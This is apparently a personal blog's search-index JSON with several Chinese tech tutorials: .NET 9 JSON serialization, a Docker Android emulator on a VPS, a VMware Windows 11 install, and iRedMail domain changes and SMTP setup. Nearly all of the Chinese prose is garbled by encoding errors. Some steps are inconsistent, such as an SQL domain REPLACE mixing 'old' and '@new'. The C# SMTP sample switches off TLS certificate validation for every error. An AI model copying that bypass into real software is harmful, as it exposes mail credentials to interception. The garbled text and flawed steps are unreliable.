æ•°å­—å¤„ç†ï¼šå…è®¸ä»å­—ç¬¦ä¸²è¯»å–æ•°å­—ï¼Œä»¥æé«˜çµæ´»æ€§ã€‚ è¿™äº›é»˜è®¤è®¾ç½®ä½¿å¾—åœ¨ Web ç¯å¢ƒä¸­è¿›è¡Œ JSON åºåˆ—åŒ–æ—¶ï¼Œæ— éœ€æ‰‹åŠ¨é…ç½®å³å¯è·å¾—ç¬¦åˆ Web æ ‡å‡†çš„è¾“å‡ºã€‚ 1234567891011121314151617181920public class Product&#123; public int Id &#123; get; set; &#125; public string Name &#123; get; set; &#125; = &quot;P1-DWD1&quot;; public decimal Price &#123; get; set; &#125; = 0.0m; // é»˜è®¤å€¼ public string? Description &#123; get; set; &#125; = null; // å¯ç©ºç±»å‹&#125;public class Program&#123; static void Main(string[] args) &#123; var product = new Product(); // ä½¿ç”¨ JsonSerializerOptions.Web è¿›è¡Œåºåˆ—åŒ– string json = JsonSerializer.Serialize(product, JsonSerializerOptions.Web); Console.WriteLine(json); &#125;&#125; {â€œidâ€:0,â€nameâ€:â€P1-DWD1â€,â€priceâ€:0.0,â€descriptionâ€:null} Debian .NET912345wget https://download.visualstudio.microsoft.com/download/pr/xxx/dotnet-sdk-9.0.0.debsudo dpkg -i dotnet-sdk-9.0.0.debsudo apt-get install -f # å¦‚æœæœ‰ä¾èµ–é—®é¢˜dotnet --version","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net9","slug":"net9","permalink":"https://banjinmei.github.io/tags/net9/"}],"author":"mu"},{"title":"vps cloud mobile","slug":"vps-cloud-mobile","date":"2025-01-01T16:00:38.000Z","updated":"2025-01-01T16:03:27.039Z","comments":true,"path":"2025/01/02/vps-cloud-mobile/","permalink":"https://banjinmei.github.io/2025/01/02/vps-cloud-mobile/","excerpt":"","text":"vps cloud mobileVPSäº‘æœåŠ¡å™¨æ­å»ºäº‘æ‰‹æœºæ•™ç¨‹ é¦–å…ˆæ£€æŸ¥è‡ªå·±vpsæ˜¯å¦æ”¯æŒè¿™ä¸ªé¡¹ç›®123sudo apt install cpu-checkerkvm-ok 123INFO: /dev/kvm existsKVM acceleration can be used è¡¨ç¤ºæ”¯æŒï¼Œå¯ä»¥ç»§ç»­å¾€ä¸‹çœ‹ ac13 å®‰è£…docker1curl -fsSL https://get.docker.com | sudo sh ç„¶åå°±æ˜¯ç›´æ¥å¼•ç”¨å¤§ä½¬çš„é¡¹ç›®äº†ï¼ˆæ„Ÿè°¢budtmoå¤§ä½¬çš„åˆ†äº«ï¼‰ 12docker run -d -p 29898:6080 -e EMULATOR_DEVICE=&quot;Samsung Galaxy S10&quot; -e WEB_VNC=true -e VNC_PASSWORD=nodeseek --device /dev/kvm --name android-container budtmo/docker-android:emulator_11.0 å…¶ä¸­ï¼Œä¸Šé¢çš„ä»£ç 29898å¯ä»¥æ”¹æˆè‡ªå·±æƒ³è¦çš„ç«¯å£nodeseekæ”¹æˆè‡ªå·±æƒ³è¦çš„å¯†ç budtmo&#x2F;docker-android:emulator_11.0ï¼Œå¯ä»¥é€‰æ‹©å®‰å“9.0åˆ°13.0ï¼ˆæ ¹æ®è‡ªå·±çš„vpsé…ç½®ï¼Œç›´æ¥æ”¹æœ€åé¢çš„æ•°å­—ï¼‰Samsung Galaxy S10å¯ä»¥æ ¹æ®è‡ªå·±çš„é…ç½®é€‰æ‹©è‡ªå·±æƒ³è¦çš„æœºå‹ï¼Œè®¾å¤‡åå•å…·ä½“è§ä¸‹è¡¨ ç§ç±» è®¾å¤‡åç§° 1234567891011Phone Samsung Galaxy S10Phone Samsung Galaxy S9Phone Samsung Galaxy S8Phone Samsung Galaxy S7 EdgePhone Samsung Galaxy S7Phone Samsung Galaxy S6Phone Nexus 4Phone Nexus 5Phone Nexus OnePhone Nexus STablet Nexus 7 è¿è¡Œå®Œæˆåï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œåœ°å€æ è¾“å…¥IPï¼šç«¯å£ å³å¯è®¿é—®äº†ï¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"vps","slug":"vps","permalink":"https://banjinmei.github.io/tags/vps/"}],"author":"mu"},{"title":"vmware install win11","slug":"vmware-install-win11","date":"2024-12-25T17:01:25.000Z","updated":"2024-12-25T17:27:40.521Z","comments":true,"path":"2024/12/26/vmware-install-win11/","permalink":"https://banjinmei.github.io/2024/12/26/vmware-install-win11/","excerpt":"","text":"VMwareå®‰è£…win11æ–°å»ºè™šæ‹Ÿæœºç¨åå®‰è£…ç³»ç»Ÿ å³é”® ç”µæº è¿›å…¥å›ºä»¶å‡ºç° æ— æ³•è¿æ¥è™šæ‹Ÿè®¾å¤‡ sata0ï¼š1ï¼Œå› ä¸ºä¸»æœºä¸Šæ²¡ç”¨ç›¸åº”è®¾å¤‡è®¾å¤‡-å¯åŠ¨æ—¶è¿æ¥ å–æ¶ˆæ‰“é’© å³é”® å¯ç§»åŠ¨è®¾å¤‡ - Uç›˜è¿æ¥ è¿›å…¥PEæ‰“å¼€DG å³é”®è½¬ä¸ºGUID ä¿å­˜æ›´æ”¹ é¡¶éƒ¨ç©ºé—²å³é”® åˆ›å»ºESPåˆ†åŒºç©ºé—´å»ºç«‹æ–°åˆ†åŒº ç³»ç»Ÿåˆ†åŒº DSaveESPå³é”® æŒ‡å®šæ–°çš„é©±åŠ¨å™¨-ç›˜ç¬¦ F å»ºç«‹åˆ†åŒºä¿å­˜æ ¼å¼åŒ– ä¸€é”®è£…æœº!æ³¨æ„ç›®æ ‡åˆ†åŒºD&#x2F;å¼•å¯¼åˆ†åŒºF å®‰è£…å®Œé‡å¯å å³é”® å¯ç§»åŠ¨è®¾å¤‡ - Uç›˜æ–­å¼€å¼•å¯¼å®‰è£… END","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"vm","slug":"vm","permalink":"https://banjinmei.github.io/tags/vm/"},{"name":"win11","slug":"win11","permalink":"https://banjinmei.github.io/tags/win11/"}],"author":"mu"},{"title":"update domain 4 iRedMail","slug":"update-domain-4-iRedMail","date":"2024-12-21T15:20:53.000Z","updated":"2024-12-21T15:26:34.985Z","comments":true,"path":"2024/12/21/update-domain-4-iRedMail/","permalink":"https://banjinmei.github.io/2024/12/21/update-domain-4-iRedMail/","excerpt":"","text":"æ›´æ¢ iRedMail çš„åŸŸåï¼ˆå¦‚ä» mail.example.com æ›´æ¢ä¸º mail.mydomain.comï¼‰ï¼Œéœ€è¦ä¿®æ”¹å¤šä¸ªé…ç½®æ–‡ä»¶å’Œæ•°æ®åº“è®°å½•ï¼Œå¹¶ç¡®ä¿æ–°çš„åŸŸåé…ç½®æ­£ç¡®ã€‚ä»¥ä¸‹æ˜¯æ“ä½œæ­¥éª¤ï¼š æ­¥éª¤ 1ï¼šæ›´æ–° DNS è®°å½•åœ¨åŸŸåæ‰˜ç®¡å¹³å°æ›´æ–° mail.mydomain.com çš„ DNS è®°å½•ï¼šAè®°å½•ï¼šæŒ‡å‘é‚®ä»¶æœåŠ¡å™¨çš„ IP åœ°å€ã€‚MXè®°å½•ï¼šæŒ‡å‘ mail.mydomain.comã€‚SPF è®°å½•ï¼šç¡®ä¿åŒ…æ‹¬æ–°çš„åŸŸåã€‚DKIM å’Œ DMARC è®°å½•ï¼šé‡æ–°ç”Ÿæˆå¹¶æ›´æ–°ã€‚ç¡®ä¿ DNS æ›´æ”¹åå¯ä»¥é€šè¿‡ dig æˆ– nslookup éªŒè¯ç”Ÿæ•ˆã€‚ æ­¥éª¤ 2ï¼šæ›´æ–°ä¸»æœºåä¿®æ”¹ä¸»æœºåï¼š 12 hostnamectl set-hostname mail.mydomain.com æ›´æ–° &#x2F;etc&#x2F;hosts æ–‡ä»¶ï¼š 12127.0.0.1 localhost127.0.1.1 mail.mydomain.com mail æ›´æ–° &#x2F;etc&#x2F;mailname æ–‡ä»¶ï¼š 1mail.mydomain.com æ­¥éª¤ 3ï¼šæ›´æ–° iRedMail é…ç½®æ–‡ä»¶ä¿®æ”¹ Postfix é…ç½®ï¼š ç¼–è¾‘ &#x2F;etc&#x2F;postfix&#x2F;main.cfï¼š 1234myhostname = mail.mydomain.commydomain = mydomain.commyorigin = $mydomain é‡å¯ Postfixï¼š 1systemctl restart postfix ä¿®æ”¹ Dovecot é…ç½®ï¼š ç¼–è¾‘ &#x2F;etc&#x2F;dovecot&#x2F;dovecot.conf å’Œ &#x2F;etc&#x2F;dovecot&#x2F;conf.d&#x2F;10-mail.confï¼Œç¡®ä¿æ›´æ–°ä¸»æœºåï¼š 12ssl_cert = &lt;/etc/ssl/certs/mail.igrmail.pics.crtssl_key = &lt;/etc/ssl/private/mail.igrmail.pics.key é‡å¯ Dovecotï¼š 1systemctl restart dovecot ä¿®æ”¹ Amavisd é…ç½®ï¼š ç¼–è¾‘ &#x2F;etc&#x2F;amavis&#x2F;conf.d&#x2F;50-userï¼š 1$myhostname = &#x27;mail.mydomain.com&#x27;; é‡å¯ Amavisdï¼š 12 systemctl restart amavis ä¿®æ”¹ iRedAdmin é…ç½®ï¼š ç¼–è¾‘ &#x2F;opt&#x2F;www&#x2F;iredadmin&#x2F;settings.pyï¼š 1web_hostname = &#x27;mail.igrmail.pics&#x27; é‡å¯ iRedAdminï¼š 1systemctl restart iredadmin æ­¥éª¤ 4ï¼šæ›´æ–°æ•°æ®åº“è®°å½•ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç™»å½•æ•°æ®åº“ï¼ˆé€šå¸¸æ˜¯ MySQL&#x2F;MariaDBï¼‰ï¼š 1mysql -u root -p æ›´æ–° vmail æ•°æ®åº“ä¸­çš„åŸŸåï¼š 12345 USE vmail;UPDATE domain SET domain=&#x27;new&#x27; WHERE domain=&#x27;old&#x27;;UPDATE alias SET address=REPLACE(address, &#x27;old&#x27;, &#x27;@new&#x27;);UPDATE mailbox SET username=REPLACE(username, &#x27;@old&#x27;, &#x27;@new&#x27;); æ­¥éª¤ 5ï¼šé‡æ–°ç”Ÿæˆ SSL è¯ä¹¦å¦‚æœä½ ä½¿ç”¨ Letâ€™s Encryptï¼š 12 certbot --apache -d mail.xxx å°†æ–°ç”Ÿæˆçš„è¯ä¹¦è·¯å¾„æ›´æ–°åˆ°ç›¸å…³æœåŠ¡çš„é…ç½®æ–‡ä»¶ä¸­ï¼ˆå¦‚ Postfixã€Dovecotï¼‰ã€‚ æ­¥éª¤ 6ï¼šé‡å¯æ‰€æœ‰ç›¸å…³æœåŠ¡ç¡®ä¿æ‰€æœ‰æœåŠ¡éƒ½é‡å¯ä»¥åŠ è½½æ–°çš„é…ç½®ï¼š 12 systemctl restart postfix dovecot amavis clamav spamassassin iredapd iredadmin æ­¥éª¤ 7ï¼šéªŒè¯é…ç½®æ£€æŸ¥æœåŠ¡çŠ¶æ€ï¼š 1systemctl status postfix dovecot amavis å‘é€å’Œæ¥æ”¶æµ‹è¯•é‚®ä»¶ï¼Œç¡®ä¿æ–°åŸŸåèƒ½æ­£å¸¸å·¥ä½œã€‚éªŒè¯ MXã€SPFã€DKIM å’Œ DMARC è®°å½•æ˜¯å¦æ­£ç¡®ã€‚å®Œæˆè¿™äº›æ­¥éª¤åï¼Œä½ çš„é‚®ä»¶æœåŠ¡å™¨å°†ä¼šåˆ‡æ¢åˆ°æ–°çš„åŸŸåã€‚ debian å®‰è£… MariaDBåœ¨Debianç³»ç»Ÿä¸Šå®‰è£…MariaDBï¼Œä½ å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š æ›´æ–°ç³»ç»ŸåŒ…åˆ—è¡¨ï¼š sudo apt updateå®‰è£…MariaDBæœåŠ¡å™¨ï¼š sudo apt install mariadb-serverå®‰å…¨è®¾ç½®MariaDBï¼ŒåŒ…æ‹¬è®¾ç½®rootå¯†ç å’Œåˆ é™¤åŒ¿åç”¨æˆ·ï¼š sudo mysql_secure_installationå¯åŠ¨MariaDBæœåŠ¡ï¼š sudo systemctl start mariadbä½¿MariaDBæœåŠ¡åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨è¿è¡Œï¼š sudo systemctl enable mariadbç™»å½•MariaDBä»¥ç¡®ä¿ä¸€åˆ‡æ­£å¸¸ï¼š sudo mysql -u root -på½“ç³»ç»Ÿæç¤ºè¾“å…¥å¯†ç æ—¶ï¼Œè¾“å…¥ä½ åœ¨å®‰å…¨è®¾ç½®æ­¥éª¤ä¸­è®¾ç½®çš„å¯†ç ã€‚ ä»¥ä¸Šæ­¥éª¤å°†åœ¨Debianç³»ç»Ÿä¸Šå®‰è£…MariaDBï¼Œå¹¶ç¡®ä¿å…¶å®‰å…¨å’Œè‡ªåŠ¨å¯åŠ¨ã€‚ è¿æ¥MariaDB (like mysql)SHOW DATABASES;SHOW TABLES;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"},{"name":"iRedMail","slug":"iRedMail","permalink":"https://banjinmei.github.io/tags/iRedMail/"}],"author":"mu"},{"title":"iRedMail smtp","slug":"iRedMail-smtp","date":"2024-12-19T12:50:57.000Z","updated":"2025-01-27T10:13:23.549Z","comments":true,"path":"2024/12/19/iRedMail-smtp/","permalink":"https://banjinmei.github.io/2024/12/19/iRedMail-smtp/","excerpt":"","text":"iRedMailiRedMail æ˜¯ä¸€ä¸ª shell è„šæœ¬ï¼Œå¯ä»¥åœ¨ Linux&#x2F;BSD æœåŠ¡å™¨ä¸Šè‡ªåŠ¨å®‰è£…å’Œé…ç½®æ‰€æœ‰å¿…éœ€çš„é‚®ä»¶æœåŠ¡å™¨ç»„ä»¶ï¼Œä»è€Œæ¶ˆé™¤æ‰‹åŠ¨å®‰è£…å’Œé…ç½®ã€‚å€ŸåŠ© iRedMailï¼Œå¯ä»¥åœ¨åŸºäº Web çš„ç®¡ç†é¢æ¿ä¸­è½»æ¾åˆ›å»ºæ— é™çš„é‚®ç®±å’Œæ— é™çš„é‚®ä»¶åŸŸã€‚é‚®ç®±å¯ä»¥å­˜å‚¨åœ¨ MariaDB&#x2F;MySQLã€PostreSQL æ•°æ®åº“æˆ– OpenLDAP ä¸­ã€‚ä»¥ä¸‹æ˜¯ iRedMail å°†è‡ªåŠ¨å®‰è£…å’Œé…ç½®çš„å¼€æºè½¯ä»¶çš„åˆ—è¡¨ã€‚ PostfixSMTP æœåŠ¡å™¨Dovecot IMAP æœåŠ¡å™¨Nginx ç½‘ç»œæœåŠ¡å™¨ï¼Œä¸ºç®¡ç†é¢æ¿å’Œç½‘ç»œé‚®ä»¶æä¾›æœåŠ¡OpenLDAPã€MySQL&#x2F;MariaDB æˆ– PostgreSQL ç”¨äºå­˜å‚¨ç”¨æˆ·ä¿¡æ¯Amavided-ç”¨äº DKIM ç­¾åå’ŒéªŒè¯çš„æ–°åŠŸèƒ½SpamAssassin ç”¨äºååƒåœ¾é‚®ä»¶ClamAV ç”¨äºé˜²ç—…æ¯’Roundcube ç½‘ç»œé‚®ä»¶SOGoç»„ä»¶ï¼Œæä¾›ç½‘ç»œé‚®ä»¶ã€æ—¥å†(CalDAV)ã€è”ç³»äºº(CardDAV)ã€ä»»åŠ¡å’ŒActiveSyncæœåŠ¡ã€‚ç”¨äºä¿æŠ¤ SSH çš„ Fail2banmlmmj é‚®ä»¶åˆ—è¡¨ç®¡ç†å™¨ç½‘ç»œæ•°æ®æœåŠ¡å™¨ç›‘æ§ç”¨äºç°åå•çš„ iRedAPD Postfix ç­–ç•¥æœåŠ¡å™¨ 1.åˆ›å»º DNS MX è®°å½•MX è®°å½•æŒ‡å®šå“ªä¸ªæˆ–å“ªäº›ä¸»æœºå¤„ç†ç‰¹å®šåŸŸåçš„ç”µå­é‚®ä»¶ã€‚ä¾‹å¦‚ï¼Œå¤„ç† linux-terminal.com ç”µå­é‚®ä»¶çš„ä¸»æœºæ˜¯ mail.linux-terminal.comã€‚å¦‚æœæ‹¥æœ‰ Gmail å¸æˆ·çš„äººå‘ [email å‘é€ç”µå­é‚®ä»¶ï¼Œåˆ™ Gmail æœåŠ¡å™¨å°†æŸ¥è¯¢ linux-terminal.com çš„ MX è®°å½•ã€‚å½“å‘ç°mail.linux-terminal.comè´Ÿè´£æ¥æ”¶é‚®ä»¶æ—¶ï¼Œå®ƒä¼šæŸ¥è¯¢mail.linux-terminal.comçš„Aè®°å½•æ¥è·å–IPåœ°å€ï¼Œä»è€Œå¯ä»¥å‘é€ç”µå­é‚®ä»¶ã€‚ å¯ä»¥ç™»å½•åŸŸåæ³¨å†Œå•†çš„ç½‘ç«™ï¼ˆä¾‹å¦‚ NameCheapï¼‰æ¥åˆ›å»º DNS è®°å½•ã€‚ åœ¨ DNS ç®¡ç†å™¨ä¸­ï¼Œä¸ºåŸŸååˆ›å»º MX è®°å½•ã€‚åœ¨â€œåç§°â€å­—æ®µä¸­è¾“å…¥ @ ä»¥è¡¨ç¤ºä¸»åŸŸåï¼Œç„¶ååœ¨â€œå€¼â€å­—æ®µä¸­è¾“å…¥ mail.your-domain.comã€‚ æ³¨æ„ï¼šMXè®°å½•çš„ä¸»æœºåä¸èƒ½æ˜¯å…¶ä»–åç§°çš„åˆ«åã€‚å¦å¤–ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨ä¸»æœºåè€Œä¸æ˜¯è£¸ IP åœ°å€ä½œä¸º MX è®°å½•ã€‚ DNS ç®¡ç†å™¨å¯èƒ½ä¼šè¦æ±‚è¾“å…¥é¦–é€‰é¡¹å€¼ï¼ˆä¹Ÿç§°ä¸ºä¼˜å…ˆçº§å€¼ï¼‰ã€‚å®ƒå¯ä»¥æ˜¯ 0 åˆ° 65,356 ä¹‹é—´çš„ä»»æ„æ•°å­—ã€‚å°æ•°å­—æ¯”å¤§æ•°å­—å…·æœ‰æ›´é«˜çš„ä¼˜å…ˆçº§ã€‚å»ºè®®å°†è¯¥å€¼è®¾ç½®ä¸º0ï¼Œè¿™æ ·è¯¥é‚®ä»¶æœåŠ¡å™¨å°†å…·æœ‰æœ€é«˜çš„ä¼˜å…ˆçº§æ¥æ¥æ”¶ç”µå­é‚®ä»¶ã€‚åˆ›å»º MX è®°å½•åï¼Œè¿˜éœ€è¦ä¸º mail.your-domain.com åˆ›å»º A è®°å½•ï¼Œä»¥ä¾¿å°†å…¶è§£æä¸º IP åœ°å€ã€‚å¦‚æœæœåŠ¡å™¨ä½¿ç”¨ IPv6 åœ°å€ï¼Œè¯·åŠ¡å¿…æ·»åŠ  AAAA è®°å½•ã€‚ æç¤ºï¼šå¦‚æœä½¿ç”¨ Cloudflare DNS æœåŠ¡ï¼Œåˆ™åœ¨ä¸º mail.your-domain.com åˆ›å»º A è®°å½•æ—¶ä¸åº”å¯ç”¨ CDN åŠŸèƒ½ã€‚ Cloudflare ä¸æ”¯æŒ SMTP ä»£ç†ã€‚ @ . mail A è®°å½• åˆ° IP mail MX è®°å½•åˆ° mail.your-domain.com 2.é…ç½®ä¸»æœºåé€šè¿‡ SSH ç™»å½•æœåŠ¡å™¨ï¼Œç„¶åè¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ›´æ–°ç°æœ‰è½¯ä»¶åŒ…ã€‚ 12sudo apt update;sudo apt upgrade; å»ºè®®åˆ›å»ºä¸€ä¸ª sudo ç”¨æˆ·æ¥ç®¡ç†æœåŠ¡å™¨ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é»˜è®¤çš„ root ç”¨æˆ·ã€‚è¿è¡Œä»¥ä¸‹å‘½ä»¤åˆ›å»ºç”¨æˆ·ã€‚å°† username æ›¿æ¢ä¸ºé¦–é€‰çš„ç”¨æˆ·åã€‚ 1adduser username ç„¶åå°†ç”¨æˆ·æ·»åŠ åˆ° sudo ç»„ã€‚ 1adduser username sudo ç„¶ååˆ‡æ¢åˆ°æ–°ç”¨æˆ·ã€‚ 1su - username æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¸ºæœåŠ¡å™¨è®¾ç½®å®Œå…¨é™å®šåŸŸå (FQDN)ã€‚1sudo hostnamectl set-hostname mail.your-domain.com ä»¬è¿˜éœ€è¦ä½¿ç”¨ Nano ç­‰å‘½ä»¤è¡Œæ–‡æœ¬ç¼–è¾‘å™¨æ›´æ–° &#x2F;etc&#x2F;hosts æ–‡ä»¶ã€‚ 1sudo nano /etc/hosts åƒä¸‹é¢è¿™æ ·ç¼–è¾‘å®ƒã€‚ ï¼ˆä½¿ç”¨ç®­å¤´é”®åœ¨æ–‡ä»¶ä¸­ç§»åŠ¨å…‰æ ‡ã€‚ï¼‰ 1127.0.0.1 mail.your-domain.com localhost ä¿å­˜å¹¶å…³é—­æ–‡ä»¶ã€‚ ï¼ˆè¦åœ¨ Nano æ–‡æœ¬ç¼–è¾‘å™¨ä¸­ä¿å­˜æ–‡ä»¶ï¼Œè¯·æŒ‰ Ctrl+Oï¼Œç„¶åæŒ‰ Enter ç¡®è®¤ã€‚è¦å…³é—­æ–‡ä»¶ï¼Œè¯·æŒ‰ Ctrl+X &gt;.) è¦æŸ¥çœ‹æ›´æ”¹ï¼Œè¯·æ³¨é”€å¹¶é‡æ–°ç™»å½•ï¼Œç„¶åè¿è¡Œä»¥ä¸‹å‘½ä»¤ä»¥æŸ¥çœ‹ä¸»æœºåã€‚ 1hostname -f 3.ä½¿ç”¨ iRedMail åœ¨ Debian 12 ä¸Šè®¾ç½®é‚®ä»¶æœåŠ¡å™¨è¿è¡Œä»¥ä¸‹å‘½ä»¤ä»å…¶ Github å­˜å‚¨åº“ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„ iRedMail è„šæœ¬å®‰è£…ç¨‹åºã€‚ 1wget https://github.com/iredmail/iRedMail/archive/1.6.4.tar.gz æå–å­˜æ¡£æ–‡ä»¶ã€‚ 1tar xvf 1.6.4.tar.gz ç„¶å cd è¿›å…¥æ–°åˆ›å»ºçš„ç›®å½•ã€‚ 1cd iRedMail-1.6.4/ ä¸ºiRedMail.shè„šæœ¬æ·»åŠ å¯æ‰§è¡Œæƒé™ã€‚ 1chmod +x iRedMail.sh æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ sudo æƒé™è¿è¡Œ Bash è„šæœ¬ã€‚ 1sudo bash iRedMail.sh å°†å‡ºç°é‚®ä»¶æœåŠ¡å™¨è®¾ç½®å‘å¯¼ã€‚ä½¿ç”¨ Tab é”®é€‰æ‹© YESï¼Œç„¶åæŒ‰ Enterã€‚Welcome and thanks for your use ä¸‹ä¸€ä¸ªå±å¹•å°†è¦æ±‚é€‰æ‹©é‚®ä»¶å­˜å‚¨è·¯å¾„ã€‚å¯ä»¥ä½¿ç”¨é»˜è®¤çš„ &#x2F;var&#x2F;vmailï¼Œåªéœ€æŒ‰ Enter é”®å³å¯ã€‚sub-directory:&#x2F;var&#x2F;vmail&#x2F;backup ç„¶åé€‰æ‹©æ˜¯å¦è¦è¿è¡Œ Web æœåŠ¡å™¨ã€‚å¼ºçƒˆå»ºè®®é€‰æ‹©è¿è¡Œ Web æœåŠ¡å™¨ï¼Œå› ä¸ºéœ€è¦åŸºäº Web çš„ç®¡ç†é¢æ¿æ¥æ·»åŠ ç”µå­é‚®ä»¶å¸æˆ·ã€‚å®ƒè¿˜å…è®¸è®¿é—® Roundcube ç½‘ç»œé‚®ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œé€‰æ‹© Nginx Web æœåŠ¡å™¨ï¼Œå› æ­¤åªéœ€æŒ‰ Enter é”®å³å¯ã€‚ ï¼ˆæ˜Ÿå·è¡¨ç¤ºè¯¥é¡¹ç›®å·²è¢«é€‰ä¸­ã€‚ï¼‰Nginx The fastest web server ç„¶åé€‰æ‹©ç”µå­é‚®ä»¶å¸æˆ·çš„å­˜å‚¨åç«¯ã€‚é€‰æ‹©ç†Ÿæ‚‰çš„ä¸€ä¸ªã€‚é€‰æ‹©MariaDBã€‚æŒ‰ä¸Šä¸‹æ–¹å‘é”®å¹¶æŒ‰ç©ºæ ¼é”®è¿›è¡Œé€‰æ‹©ã€‚select item. å¦‚æœé€‰æ‹©äº† MariaDB æˆ– MySQLï¼Œé‚£ä¹ˆå°†éœ€è¦è®¾ç½® MySQL root å¯†ç ã€‚ 123123.zroot on server æ¥ä¸‹æ¥ï¼Œè¾“å…¥ç¬¬ä¸€ä¸ªé‚®ä»¶åŸŸã€‚å¯ä»¥ç¨ååœ¨åŸºäº Web çš„ç®¡ç†é¢æ¿ä¸­æ·»åŠ å…¶ä»–é‚®ä»¶åŸŸã€‚æœ¬æ•™ç¨‹å‡è®¾éœ€è¦ä¸€ä¸ªç”µå­é‚®ä»¶å¸æˆ·ï¼Œä¾‹å¦‚[å—ä¿æŠ¤çš„ç”µå­é‚®ä»¶]ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦åœ¨æ­¤å¤„è¾“å…¥ your-domain.comï¼Œä¸å¸¦å­åŸŸã€‚ä¸è¦åœ¨åŸŸååé¢æŒ‰ç©ºæ ¼é”®ã€‚è®¤ä¸º iRedMail ä¼šå°†ç©ºæ ¼å­—ç¬¦ä¸åŸŸåä¸€èµ·å¤åˆ¶ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å®‰è£…å¤±è´¥ã€‚Postfix wonâ€™t accept anyemail sent to this mail domain. æ¥ä¸‹æ¥ï¼Œè®¾ç½®é‚®ä»¶åŸŸç®¡ç†å‘˜çš„å¯†ç ã€‚iRedAdmin with this account. é€‰æ‹©å¯é€‰ç»„ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œé€‰æ‹© 4 ä¸ªé¡¹ç›®ã€‚å¦‚æœå–œæ¬¢ SOGo ç»„ä»¶ï¼Œè¯·é€‰æ‹©å®ƒå¹¶æŒ‰ Enterã€‚ Review your settingsç°åœ¨å¯ä»¥æ£€æŸ¥é…ç½®ã€‚è¾“å…¥ Y å¼€å§‹å®‰è£…æ‰€æœ‰é‚®ä»¶æœåŠ¡å™¨ç»„ä»¶ã€‚ å®‰è£…ç»“æŸæ—¶ï¼Œé€‰æ‹©Y ä½¿ç”¨iRedMailæä¾›çš„é˜²ç«å¢™è§„åˆ™å¹¶é‡æ–°å¯åŠ¨é˜²ç«å¢™ã€‚ Y è‡³æ­¤iRedMailå®‰è£…å®Œæˆã€‚å°†æ”¶åˆ°ç½‘ç»œé‚®ä»¶ã€SOGo ç»„ä»¶å’Œç½‘ç»œç®¡ç†é¢æ¿çš„ URL ä»¥åŠç™»å½•å‡­æ®çš„é€šçŸ¥ã€‚ iRedMail.tips æ–‡ä»¶åŒ…å«æœ‰å…³ iRedMail æœåŠ¡å™¨çš„é‡è¦ä¿¡æ¯ã€‚URLs of installed web applications: reboot é‡å¯https://mail.your-domain.com/iredadmin/ è®¿é—®ç®¡ç†é¢æ¿ç™»å½•å æœ€åè¾¹æ·»åŠ -&gt;ç”¨æˆ· è¾“å…¥ä¿¡æ¯å³å¯æ·»åŠ ç”¨æˆ· https://mail.your-domain.com/ ç”¨æˆ·ç™»å½•é¢æ¿ ä»£ç è°ƒç”¨smtpå‘é€ç¤ºä¾‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960using System.Net.Mail;using System.Net;using System.Security.Cryptography.X509Certificates;using System.Net.Security;namespace ConsoleApp1Mail&#123; internal class Program &#123; static void Main(string[] args) &#123; string smtpServer = &quot;mail.myimmail.workxx&quot;; int smtpPort = 587; string smtpUser = &quot;postmaster@myimmail.workxx&quot;; string smtpPassword = &quot;xxx&quot;; string recipientEmail = &quot;reemail&quot;; // å¿½ç•¥è¯ä¹¦éªŒè¯ ServicePointManager.ServerCertificateValidationCallback = delegate ( object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) &#123; return true; // å¿½ç•¥æ‰€æœ‰è¯ä¹¦é”™è¯¯ &#125;; SendVerificationEmail(smtpServer, smtpPort, smtpUser, smtpPassword, recipientEmail); &#125; static void SendVerificationEmail(string smtpServer, int smtpPort, string smtpUser, string smtpPassword, string recipientEmail) &#123; string subject = &quot;Email Verification&quot;; string body = &quot;This is your verification code: 123456&quot;; try &#123; using (SmtpClient client = new SmtpClient(smtpServer, smtpPort)) &#123; client.Credentials = new NetworkCredential(smtpUser, smtpPassword); client.EnableSsl = true; // å¯ç”¨ SSL MailMessage message = new MailMessage &#123; From = new MailAddress(smtpUser), Subject = subject, Body = body &#125;; message.To.Add(recipientEmail); client.Send(message); Console.WriteLine(&quot;Email sent successfully!&quot;); &#125; &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error: &#123;ex.Message&#125;&quot;); &#125; &#125; &#125;&#125; å®‰è£…å®Œiredéœ€è¦é‡å¯~","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"iRedMail","slug":"iRedMail","permalink":"https://banjinmei.github.io/tags/iRedMail/"},{"name":"smtp","slug":"smtp","permalink":"https://banjinmei.github.io/tags/smtp/"}],"author":"mu"},{"title":"HarmonryOS Next Waste 